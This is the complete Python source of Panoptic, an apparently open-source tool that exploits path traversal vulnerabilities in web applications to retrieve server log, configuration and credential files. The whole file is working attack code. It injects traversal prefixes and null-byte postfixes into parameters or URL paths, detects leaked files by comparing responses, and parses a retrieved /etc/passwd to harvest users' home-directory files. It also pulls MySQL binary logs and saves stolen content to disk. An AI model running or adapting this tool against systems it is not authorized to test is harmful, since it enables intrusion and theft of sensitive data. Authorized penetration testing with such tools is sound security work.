#!/usr/bin/env python3

"""
Copyright (c) 2013-2015 Roberto Christopher Salgado Bjerre, Miroslav Stampar.

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation the
rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
sell copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

"""
Panoptic

Search and retrieve content of common log and config files through path traversal vulnerability
"""

import difflib
import os
import random
import re
import string
import sys
import ssl
import threading
import time
import xml.etree.ElementTree as ET

from urllib.parse import urlencode, urlsplit, urlunsplit, parse_qsl
from urllib.request import build_opener, install_opener, urlopen, ProxyHandler, Request
from optparse import OptionParser
from subprocess import Popen, PIPE

NAME = "Panoptic"
VERSION = "v1.0"
URL = "https://github.com/lightos/Panoptic/"

# Used for retrieving response for a dummy filename
INVALID_FILENAME = "".join(random.sample(string.ascii_letters, 10))

# Maximum length of left option column in help listing
MAX_HELP_OPTION_LENGTH = 20

# Location of file containing test cases
CASES_FILE = "cases.xml"

# Location of file containing user agents
USER_AGENTS_FILE = "agents.txt"

# Location of file containing common user files
HOME_FILES_FILE = "home.txt"

# Used for heuristic comparison of responses
HEURISTIC_RATIO = 0.9

# If content size is bigger than normal (and illegal) skip content retrieval (if --write-files not used) and mark it as found
SKIP_RETRIEVE_THRESHOLD = 1000

# ASCII eye taken from http://www.retrojunkie.com/asciiart/health/eyes.htm
BANNER = """
 .-',--.`-.
<_ | () | _>
  `-`=='-'

%s %s (%s)
""" % (NAME, VERSION, URL)

# Character used for progress rotator
ROTATOR_CHARS = "|/-\\"

# Location of Git repository
GIT_REPOSITORY = "git://github.com/lightos/Panoptic.git"

EXAMPLES = """
Examples:
./panoptic.py --url "http://localhost/include.php?file=test.txt"
./panoptic.py --url "http://localhost/include.php?file=test.txt&id=1" --param file
./panoptic.py --url "http://localhost/include.php" --data "file=test.txt&id=1" --param file
./panoptic.py --url "http://localhost/files/view/test.txt" --path-based --prefix "..%252f"

./panoptic.py --list software
./panoptic.py --list category
./panoptic.py --list os

./panoptic.py -u "http://localhost/include.php?file=test.txt" --os Windows
./panoptic.py -u "http://localhost/include.php?file=test.txt" --software WAMP
"""


class PROXY_TYPE:
    HTTP = "HTTP"
    HTTPS = "HTTPS"
    SOCKS4 = "SOCKS4"
    SOCKS5 = "SOCKS5"


class HTTP_HEADER:
    COOKIE = "Cookie"
    USER_AGENT = "User-agent"
    CONTENT_LENGTH = "Content-length"


class AttribDict(dict):

    def __getattr__(self, name):
        return self.get(name)

    def __setattr__(self, name, value):
        return self.__setitem__(name, value)

# Knowledge base used for storing program wide settings
kb = AttribDict()

# Variable used to store command parsed arguments
args = None


def print_func(*args, **kwargs):
    """
    Thread-safe version of print function
    """

    with kb.print_lock:
        return print(*args, **kwargs)


def get_cases(args):
    """
    Parse XML and return testing cases filtered by provided args
    """

    tree = ET.parse(CASES_FILE)
    root = tree.getroot()

    # Create a map of child->parent for ElementTree elements
    # Map each ElementTree element to its parent to enable filtering of XML nodes
    parent_map = {c: p for p in root.iter() for c in p}

    # Create a map to store attributes of each element
    # This will include both XML attributes and text content for each element
    attr_map = {}

    def _(element):
        # Store the attributes in our map
        attr_map[element] = {}
        for key, value in element.attrib.items():
            attr_map[element][key] = value
        for child in list(element):
            _(child)

    # Process all elements
    _(root)

    # Helper to get attribute value for an element
    def get_attr(element, name):
        # First, try to get the attribute directly from the element's attributes
        if element is not None and name in element.attrib:
            return element.attrib.get(name)

        # If not found in direct attributes, try the attr_map
        return attr_map.get(element, {}).get(name)

    for element in root.findall(".//os") + root.findall(".//software") + root.findall(".//category") + root.findall(".//file"):
        if element.text:
            attr_map[element]['value'] = element.text.strip()

    # Filter based on attributes
    for attr in ("os", "software", "category"):
        if getattr(args, attr):
            user_value = getattr(args, attr).lower()
            for element in root.findall(".//%s" % attr):
                value = get_attr(element, 'value')
                if value:
                    value_lower = value.lower()
                    # For all attributes, use exact matching only (not substring)
                    if value_lower != user_value:
                        parent = parent_map.get(element)
                        if parent is not None:
                            parent.remove(element)

    # Filter based on type
    if args.type:
        for _ in (_ for _ in ("conf", "log", "other") if _.lower() != args.type.lower()):
            for element in root.findall(".//%s" % _):
                parent = parent_map.get(element)
                if parent is not None:
                    parent.remove(element)

    # Helper: find nearest ancestor element matching given tag
    def find_parent_with_tag(element, tag):
        current = element
        while parent_map.get(current) is not None:
            parent = parent_map.get(current)
            if parent.tag == tag:
                return parent
            current = parent
        return None

    cases = []
    replacements = {}

    if args.url:
        replacements["HOST"] = urlsplit(args.url).netloc

    for element in root.findall(".//file"):
        case = AttribDict()
        case.location = get_attr(element, 'value')

        os_parent = find_parent_with_tag(element, "os")
        category_parent = find_parent_with_tag(element, "category")
        software_parent = find_parent_with_tag(element, "software")

        case.os = get_attr(os_parent, 'value') if os_parent is not None else None
        case.category = get_attr(category_parent, 'value') if category_parent is not None else None
        case.software = get_attr(software_parent, 'value') if software_parent is not None else None

        # Determine type
        if find_parent_with_tag(element, "log") is not None:
            case.type = "log"
        elif find_parent_with_tag(element, "conf") is not None:
            case.type = "conf"
        elif find_parent_with_tag(element, "other") is not None:
            case.type = "other"
        else:
            case.type = None

        for variable in re.findall(r"\{[^}]+\}", case.location):
            case.location = case.location.replace(variable, replacements.get(variable.strip("{}"), variable))

        match = re.search(r"\[([^\]]+)\]", case.location)
        if match and kb.through:
            original = case.location
            for replacement in kb.versioned_locations[match.group(1)]:
                case_copy = AttribDict(case)
                case_copy.location = original.replace(match.group(0), replacement)
                cases.append(case_copy)
        else:
            cases.append(case)

    return cases


def load_list(filepath):
    """
    Loads list of items from a custom given filepath location
    """

    items = []
    cases = []

    with open(filepath, 'r') as f:
        items = f.readlines()

    for item in items:
        case = AttribDict({'location': item.strip()})
        cases.append(case)

    return cases


def get_revision():
    """
    Returns abbreviated commit hash number as retrieved with "git rev-parse --short HEAD"
    """

    retval = None
    filepath = None
    _ = os.path.dirname(__file__)

    while True:
        filepath = os.path.join(_, ".git", "HEAD")
        if os.path.exists(filepath):
            break
        else:
            filepath = None
            if _ == os.path.dirname(_):
                break
            else:
                _ = os.path.dirname(_)

    while True:
        if filepath and os.path.isfile(filepath):
            with open(filepath, "r") as f:
                content = f.read()
                filepath = None
                if content.startswith("ref: "):
                    filepath = os.path.join(_, ".git", content.replace("ref: ", "")).strip()
                else:
                    match = re.match(r"(?i)[0-9a-f]{32}", content)
                    retval = match.group(0) if match else None
                    break
        else:
            break

    if not retval:
        process = Popen("git rev-parse --verify HEAD", shell=True, stdout=PIPE, stderr=PIPE)
        stdout, _ = process.communicate()
        stdout = stdout.decode('utf-8') if stdout else ""
        match = re.search(r"(?i)[0-9a-f]{32}", stdout or "")
        retval = match.group(0) if match else None

    return retval[:7] if retval else None


def check_revision():
    """
    Adapts default version string and banner to use revision number (if available)
    """

    global BANNER
    global VERSION

    revision = get_revision()

    if revision:
        _ = VERSION
        VERSION = "%s-%s" % (VERSION, revision)
        BANNER = BANNER.replace(_, VERSION)


def update():
    """
    Do the program update
    """

    print_func("[i] Checking for updates...")

    process = Popen("git pull %s HEAD" % GIT_REPOSITORY, shell=True, stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()
    stdout = stdout.decode('utf-8') if stdout else ""
    stderr = stderr.decode('utf-8') if stderr else ""
    success = not process.returncode

    if success:
        updated = "Already" not in stdout
        process = Popen("git rev-parse --verify HEAD", shell=True, stdout=PIPE, stderr=PIPE)
        stdout, _ = process.communicate()
        stdout = stdout.decode('utf-8') if stdout else ""
        revision = stdout[:7] if stdout and re.search(r"(?i)[0-9a-f]{32}", stdout) else "-"
        print_func("[i] %s the latest revision '%s'." % ("Already at" if not updated else "Updated to", revision))
    else:
        print_func("[!] Problem occurred while updating program (%s)." % repr(stderr.strip()))
        print_func("[i] Please make sure that you have a 'git' package installed.")


def ask_question(question, default=None, automatic=False):
    """
    Asks a given question and returns result
    """

    question = "[?] %s " % question

    if automatic:
        answer = default
        print_func("%s%s" % (question, answer))
    else:
        with kb.print_lock:
            answer = input(question)

    print_func("")

    return answer


def prepare_request(payload):
    """
    Prepares HTTP (GET or POST) request with proper payload
    """

    # Handle path-based URL format if specified
    if args.path_based:
        # Extract the base path from the URL (everything up to the last /)
        path = kb.parsed_target_url.path
        last_slash = path.rfind('/')

        if last_slash >= 0:
            base_path = path[:last_slash]
            # For the first request, store the original filename
            if not hasattr(kb, "original_filename"):
                kb.original_filename = path[last_slash+1:]

            # Construct a URL with the payload replacing the filename
            url = "%s://%s%s/%s" % (
                kb.parsed_target_url.scheme or "http",
                kb.parsed_target_url.netloc,
                base_path,
                payload or kb.original_filename
            )

            request_args = {"url": url}
        else:
            # Fallback if we can't find a slash in the path
            request_args = {"url": "%s://%s/%s" % (
                kb.parsed_target_url.scheme or "http",
                kb.parsed_target_url.netloc,
                payload or ""
            )}
    else:
        # Standard query parameter-based processing
        _ = re.sub(r"(?P<param>%s)=(?P<value>[^=&]*)" % args.param,
                r"\1=%s" % (payload or ""), kb.request_params)

        request_args = {"url": "%s://%s%s" % (kb.parsed_target_url.scheme or "http", kb.parsed_target_url.netloc, kb.parsed_target_url.path)}

        if args.data:
            request_args["data"] = _
        else:
            request_args["url"] += "?%s" % _

    if args.header:
        request_args["header"] = args.header

    if args.cookie:
        request_args["cookie"] = args.cookie

    if args.user_agent:
        request_args["user_agent"] = args.user_agent

    request_args["verbose"] = args.verbose
    request_args["invalid_ssl"] = args.invalid_ssl

    # Show the URL in verbose mode
    if args.verbose and payload:
        print_func("[*] Request URL: %s" % request_args["url"])

    return request_args


def clean_response(response, filepath):
    """
    Cleans response from occurrences of filepath
    """

    response = response.replace(filepath, "")
    # Build regex to escape special characters in filepath for matching
    regex = re.sub(r"[^A-Za-z0-9]", r"(.|&\\w+;|%[0-9A-Fa-f]{2})", filepath)

    return re.sub(regex, "", response, re.I)


def request_file(case, replace_slashes=True):
    """
    Requests target for a file described in case
    """

    global ROTATOR_CHARS

    if args.replace_slash and replace_slashes:
        case.location = case.location.replace("/", args.replace_slash.replace("\\", "\\\\"))

    if kb.restrict_os and kb.restrict_os != case.os:
        if args.verbose:
            print_func("[*] Skipping '%s'." % case.location)

        return None

    if args.prefix and args.prefix[len(args.prefix) - 1] == "/":
        args.prefix = args.prefix[:-1]

    _ = "%s%s%s" % (args.prefix, case.location, args.postfix)
    if args.verbose:
        print_func("[*] Trying '%s'." % _)
    else:
        with kb.print_lock:
            sys.stdout.write("\r%s\r" % ROTATOR_CHARS[0])
            sys.stdout.flush()

    ROTATOR_CHARS = ROTATOR_CHARS[1:] + ROTATOR_CHARS[0]

    request_args = prepare_request(_)
    html = get_page(**request_args)

    if not html or args.bad_string and html.find(args.bad_string) != -1:
        return None

    matcher = difflib.SequenceMatcher(None, clean_response(html, case.location), clean_response(kb.invalid_response, INVALID_FILENAME))

    if matcher.quick_ratio() < HEURISTIC_RATIO:
        with kb.value_lock:
            if not kb.found:
                print_func("[i] Possible file(s) found!")

                if case.os:
                    print_func("[i] OS: %s" % case.os)

                    if kb.restrict_os is None:
                        answer = ask_question("Do you want to restrict further scans to '%s'? [Y/n]" % case.os, default='Y', automatic=args.automatic)
                        kb.restrict_os = answer.upper() != 'N' and case.os

        _ = "/".join(_ for _ in (case.os, case.category, case.software, case.type) if _)
        if _:
            _ = "'%s' (%s)" % (case.location, _)
            _ = _.replace("%s/%s/" % (case.os, case.os), "%s/" % case.os)
        else:
            _ = "'%s'" % case.location

        print_func("[+] Found %s." % _)

        if args.verbose:
            kb.files.append(_)

        # If --write-file is set
        if args.write_files:
            _ = os.path.join("output", kb.parsed_target_url.netloc.replace(":", "_"))

            if not os.path.exists(_):
                os.makedirs(_)

            with open(os.path.join(_, "%s.txt" % case.location.replace(args.replace_slash if args.replace_slash else "/", "_").replace(":", "_")), "w") as f:
                content = html

                with kb.value_lock:
                    if kb.filter_output is None:
                        answer = ask_question("Do you want to filter retrieved files from original HTML page content? [Y/n]", default='Y', automatic=args.automatic)
                        kb.filter_output = answer.upper() != 'N'

                if kb.get("filter_output"):
                    matcher = difflib.SequenceMatcher(None, html or "", kb.original_response or "")
                    matching_blocks = matcher.get_matching_blocks()

                    if matching_blocks:
                        start = matching_blocks[0]
                        if start[0] == start[1] == 0 and start[2] > 0:
                            content = content[start[2]:]
                        if len(matching_blocks) > 2:
                            end = matching_blocks[-2]
                            if end[2] > 0 and end[0] + end[2] == len(html) and end[1] + end[2] == len(kb.original_response):
                                content = content[:-end[2]]

                f.write(content)

        return html

    return None


def try_cases(cases):
    """
    Runs tests against given cases
    """

    passwd_files = ["/etc/passwd", "/etc/security/passwd"]

    if args.replace_slash:
        for i, v in enumerate(passwd_files):
            passwd_files[i] = v.replace("/", args.replace_slash)

    for case in cases:
        html = request_file(case)

        if html is None:
            continue
        if not kb.found:
            kb.found = True

        # If skip_parsing flag not set, parse passwd for users and attempt home directory files
        if case.location in passwd_files and not args.skip_parsing:
            users = re.finditer("(?P<username>[^:\n]+):(?P<password>[^:]*):(?P<uid>\d+):(?P<gid>\d*):(?P<info>[^:]*):(?P<home>[^:]+):[/a-z]*", html)

            if args.verbose:
                print_func("[*] Extracting home folders from '%s'." % case.location)

            for user in users:
                if args.verbose:
                    print_func("[*] User: %s, Info: %s" % (user.group("username"), user.group("info")))
                if not kb.home_files:
                    with open(HOME_FILES_FILE, "r") as f:
                        kb.home_files = list(filter(None, [_.strip() for _ in f.readlines()]))
                for _ in kb.home_files:
                    if user.group("home") == "/":
                        continue
                    request_file(AttribDict({"category": "*NIX User File", "type": "conf", "os": case.os, "location": "%s/%s" % (user.group("home"), _), "software": "*NIX"}))

        if "mysql-bin.index" in case.location and not args.skip_parsing:
            binlogs = re.findall("\\.\\\\(?P<binlog>mysql-bin\\.\\d{0,6})", html)
            location = case.location.rfind("/") + 1

            if args.verbose:
                print_func("[i] Extracting MySQL binary logs from '%s'." % case.location)

            for _ in binlogs:
                request_file(AttribDict({"category": "Databases", "type": "log", "os": case.os, "location": "%s%s" % (case.location[:location], _), "software": "MySQL"}), False)


def parse_args():
    """
    Parses command line arguments
    """

    OptionParser.format_epilog = lambda self, formatter: self.epilog  # Override epilog formatting

    parser = OptionParser(usage="usage: %prog --url TARGET [options]", epilog=EXAMPLES)

    parser.add_option("-v", "--verbose", action="store_true", dest="verbose",
                      help="display extra output information")

    # Required
    parser.add_option("-u", "--url", dest="url",
                      help="set target URL")
    # Optional
    parser.add_option("-p", "--param", dest="param",
                      help="set parameter name to test for (e.g. \"page\")")

    parser.add_option("--path-based", dest="path_based", action="store_true",
                      help="use path-based URL format instead of query parameter (e.g. \"/files/view/test.txt\")")

    parser.add_option("-d", "--data", dest="data",
                      help="set data for HTTP POST request (e.g. \"page=default\")")

    parser.add_option("-t", "--type", dest="type",
                      help="set type of file to look for (\"conf\" or \"log\")")

    parser.add_option("-o", "--os", dest="os",
                      help="set filter name for OS (e.g. \"*NIX\")")

    parser.add_option("-s", "--software", dest="software",
                      help="set filter name for software (e.g. \"PHP\")")

    parser.add_option("-c", "--category", dest="category",
                      help="set filter name for category (e.g. \"FTP\")")

    parser.add_option("-l", "--list", dest="list", metavar="GROUP",
                      help="list available filters for group (e.g. \"software\")")

    parser.add_option("-a", "--auto", dest="automatic", action="store_true",
                      help="avoid user interaction by using default options")

    parser.add_option("-w", "--write-files", dest="write_files", action="store_true",
                      help="write content of retrieved files to output folder")

    parser.add_option("-x", "--skip-parsing", dest="skip_parsing", action="store_true",
                      help="skip special tests if *NIX passwd file is found")

    parser.add_option("-i", "--invalid-ssl", dest="invalid_ssl", action="store_true",
                      help="allows testing sites that use invalid ssl certificates")

    parser.add_option("--load", dest="list_file", metavar="LISTFILE",
                      help="load and try user provided list from a file")

    parser.add_option("--ignore-proxy", dest="ignore_proxy", action="store_true",
                      help="ignore system default HTTP proxy")

    parser.add_option("--proxy", dest="proxy",
                      help="set proxy (e.g. \"socks5://192.168.5.92:9050\")")

    parser.add_option("--user-agent", dest="user_agent", metavar="UA",
                      help="set HTTP User-Agent header value")

    parser.add_option("--random-agent", dest="random_agent", action="store_true",
                      help="choose random HTTP User-Agent header value")

    parser.add_option("--cookie", dest="cookie",
                      help="set HTTP Cookie header value (e.g. \"sid=foobar\")")

    parser.add_option("--header", dest="header",
                      help="set a custom HTTP header (e.g. \"Max-Forwards=10\")")

    parser.add_option("--prefix", dest="prefix", default="",
                      help="set prefix for file path (e.g. \"../\")")

    parser.add_option("--postfix", dest="postfix", default="",
                      help="set postfix for file path (e.g. \"%00\")")

    parser.add_option("--multiplier", dest="multiplier", type="int", default=1,
                      help="set multiplication number for prefix (default: 1)")

    parser.add_option("--bad-string", dest="bad_string", metavar="STRING",
                      help="set a string occurring when file is not found")

    parser.add_option("--replace-slash", dest="replace_slash",
                      help="set replacement for char / in paths (e.g. \"/././\")")

    parser.add_option("--threads", dest="threads", type="int", default=1,
                      help="set number of threads (default: 1)")

    parser.add_option("--through", dest="through",
                      help="include testing of versioned locations")

    parser.add_option("--update", dest="update", action="store_true",
                      help="update Panoptic from official repository")

    parser.formatter.store_option_strings(parser)
    parser.formatter.store_option_strings = lambda _: None

    for option, value in parser.formatter.option_strings.items():
        value = re.sub(r"\A(-\w+) (\w+), (--[\w-]+=(\2))\Z", r"\g<1>/\g<3>", value)
        value = value.replace(", ", '/')
        if len(value) > MAX_HELP_OPTION_LENGTH:
            value = ("%%.%ds.." % (MAX_HELP_OPTION_LENGTH - parser.formatter.indent_increment)) % value
        parser.formatter.option_strings[option] = value

    args = parser.parse_args()[0]

    if args.url and not args.url.lower().startswith("http"):
        args.url = "http://%s" % args.url

    if not any((args.url, args.list, args.update)):
        parser.error("Missing argument for target url. Use '-h' for help.")

    if args.prefix:
        args.prefix = args.prefix * args.multiplier

    return args


def main():
    """
    Initializes and executes the program
    """

    global args

    kb.files = []
    kb.found = False
    kb.print_lock = threading.Lock()
    kb.value_lock = threading.Lock()
    kb.versioned_locations = {}

    check_revision()

    print_func(BANNER)

    args = parse_args()

    if args.update:
        update()
        sys.exit()

    with open("versions.ini") as f:
        section = None
        for line in f:
            line = line.strip()
            if re.match(r"\[.+\]", line):
                section = line.strip("[]")
            elif line:
                if section not in kb.versioned_locations:
                    kb.versioned_locations[section] = []
                kb.versioned_locations[section].append(line)

    cases = get_cases(args) if not args.list_file else load_list(args.list_file)

    if not cases:
        print_func("[!] No available test cases with the specified attributes.\n"
              "[!] Please verify available options with --list.")
        sys.exit()

    if args.list:
        args.list = args.list.lower()

        _ = ("category", "software", "os")
        if args.list not in _:
            print_func("[!] Valid values for option '--list' are: %s" % ", ".join(_))
            sys.exit()

        print_func("[i] Listing available filters for usage with option '--%s':\n" % args.list)

        try:
            # Collect all unique values for the requested attribute
            values = set()
            for case in cases:
                attr_value = getattr(case, args.list, None)
                if attr_value:
                    values.add(attr_value)

            # Output the collected values
            for value in values:
                print_func(value if re.search(r"\A[A-Za-z0-9]+\Z", value) else '"%s"' % value)

        except (KeyError, AttributeError) as e:
            print_func("[!] Error listing values: %s" % str(e))
        finally:
            sys.exit()

    if args.ignore_proxy:
        _ = ProxyHandler({})
        opener = build_opener(_)
        install_opener(opener)
    elif args.proxy:
        match = re.search(r"(?P<type>[^:]+)://(?P<address>[^:]+):(?P<port>\d+)", args.proxy, re.I)
        if match:
            if match.group("type").upper() in (PROXY_TYPE.HTTP, PROXY_TYPE.HTTPS):
                _ = ProxyHandler({match.group("type"): args.proxy})
                opener = build_opener(_)
                install_opener(opener)
            else:
                from thirdparty.socks import socks  # pylint: disable=import-outside-toplevel
                if match.group("type").upper() == PROXY_TYPE.SOCKS4:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, match.group("address"), int(match.group("port")), True)
                elif match.group("type").upper() == PROXY_TYPE.SOCKS5:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, match.group("address"), int(match.group("port")), True)
        else:
            print_func("[!] Wrong proxy format (proper example: \"http://127.0.0.1:8080\").")
            sys.exit()

    if args.random_agent:
        with open(USER_AGENTS_FILE, 'r') as f:
            args.user_agent = random.sample(f.readlines(), 1)[0]

    kb.parsed_target_url = urlsplit(args.url)
    kb.request_params = args.data if args.data else kb.parsed_target_url.query

    # For path-based URLs, we don't need a parameter
    if not args.path_based and not args.param:
        match = re.match("(?P<param>[^=&]+)=(?P<value>[^=&]+)", kb.request_params)
        if match:
            args.param = match.group("param")
        else:
            found = False

            for match in re.finditer("(?P<param>[^=&]+)=(?P<value>[^=&]*)", kb.request_params):
                found = True
                print_func("[x] Parameter with empty value found ('%s')." % match.group("param"))

            if found:
                print_func("[!] Please always use non-empty (valid) parameter values.")

            if not args.path_based:
                print_func("[!] No usable GET/POST parameters found.")
                print_func("[!] If this is a path-based URL (e.g. /files/view/file.txt), use --path-based")
                sys.exit()

    if args.os:
        kb.restrict_os = args.os

    print_func("[i] Starting scan at: %s\n" % time.strftime("%X"))
    print_func("[i] Checking original response...")

    request_args = prepare_request(None)
    request_args["url"] = args.url

    if args.data:
        request_args["data"] = args.data

    kb.original_response = get_page(**request_args)

    if not kb.original_response:
        print_func("[!] Something seems to be wrong with connection settings.")
        if not args.verbose:
            print_func("[i] Please rerun with switch '-v'.")
        sys.exit()

    # Decode response bytes to text if necessary
    if isinstance(kb.original_response, bytes):
        kb.original_response = kb.original_response.decode('utf-8', errors='replace')

    print_func("[i] Checking invalid response...")

    request_args = prepare_request("%s%s%s" % (args.prefix, INVALID_FILENAME, args.postfix))
    kb.invalid_response = get_page(**request_args)

    # Decode invalid response bytes to text if necessary
    if isinstance(kb.invalid_response, bytes):
        kb.invalid_response = kb.invalid_response.decode('utf-8', errors='replace')

    print_func("[i] Done!")
    print_func("[i] Searching for files...")

    if args.threads > 1:
        print_func("[i] Starting %d threads." % args.threads)

    # Launch worker threads for concurrent scanning
    threads = []
    for i in range(args.threads):
        thread = threading.Thread(target=try_cases, args=([cases[_] for _ in range(i, len(cases), args.threads)],))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    alive = True
    while alive:
        alive = False
        for thread in threads:
            if thread.is_alive():
                alive = True
                time.sleep(0.1)

    if not kb.found:
        print_func("[i] No files found!")
    elif args.verbose:
        print_func("\n[i] Files found:")
        for _ in kb.files:
            print_func("[o] %s" % _)

    print_func("  \n[i] File search complete.")
    print_func("\n[i] Finishing scan at: %s\n" % time.strftime("%X"))


def get_page(**kwargs):
    """
    Retrieves page content from a given target URL
    """

    url = kwargs.get("url", None)
    post = kwargs.get("data", None)
    header = kwargs.get("header", None)
    cookie = kwargs.get("cookie", None)
    user_agent = kwargs.get("user_agent", None)
    invalid_ssl = kwargs.get("invalid_ssl", None)
    verbose = kwargs.get("verbose", False)

    headers = {}
    parsed_url = None
    page = None

    if url is None:
        raise Exception("[!] URL cannot be None.")

    try:
        parsed_url = urlsplit(url)
    except:
        raise Exception("[!] Unable to parse URL: %s." % url)

    if user_agent is None:
        user_agent = "%s %s" % (NAME, VERSION)

    if post is None:
        parsed_url = parsed_url._replace(query=urlencode(parse_qsl(parsed_url.query)))
        url = urlunsplit(parsed_url)
    else:
        post = urlencode(parse_qsl(post)).encode('utf-8')

    if invalid_ssl:
        invalid_ssl = ssl.create_default_context()
        invalid_ssl.check_hostname = False
        invalid_ssl.verify_mode = ssl.CERT_NONE

    # Perform HTTP Request
    try:
        headers[HTTP_HEADER.USER_AGENT] = user_agent

        if cookie:
            headers[HTTP_HEADER.COOKIE] = cookie

        if header:
            headers[header.split("=")[0]] = header.split("=", 1)[1]

        req = Request(url, post, headers)
        conn = urlopen(req, context=invalid_ssl)

        # Skip retrieving overly large content to avoid performance issues
        if not args.write_files and kb.original_response and kb.invalid_response:
            _ = conn.headers.get(HTTP_HEADER.CONTENT_LENGTH, "")
            if _.isdigit():
                _ = int(_)
                if _ - max(len(kb.original_response), len(kb.invalid_response)) > SKIP_RETRIEVE_THRESHOLD:
                    page = ''.join(random.choice(string.ascii_letters) for i in range(_))

        # Get HTTP Response
        if not page:
            page = conn.read()
            # Try to decode to str if it's bytes
            if isinstance(page, bytes):
                try:
                    page = page.decode('utf-8')
                except UnicodeDecodeError:
                    # If we can't decode as UTF-8, try with latin-1 (which never fails)
                    page = page.decode('latin-1')

    except KeyboardInterrupt:
        raise

    except Exception as e:
        if hasattr(e, "read"):
            error_page = e.read()
            if isinstance(error_page, bytes):
                try:
                    error_page = error_page.decode('utf-8')
                except UnicodeDecodeError:
                    error_page = error_page.decode('latin-1')
            page = page or error_page

        if verbose:
            if hasattr(e, "msg"):
                print_func("[x] Error msg '%s'." % e.msg)
            if hasattr(e, "reason"):
                print_func("[x] Error reason '%s'." % e.reason)
            if getattr(e, "message", None):
                print_func("[x] Error message '%s'." % e.message)
            if hasattr(e, "code"):
                print_func("[x] HTTP error code '%d'." % e.code)
            if hasattr(e, "info"):
                print_func("[x] Response headers '%s'." % e.info())

    return page

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_func("[!] Ctrl-C pressed.")
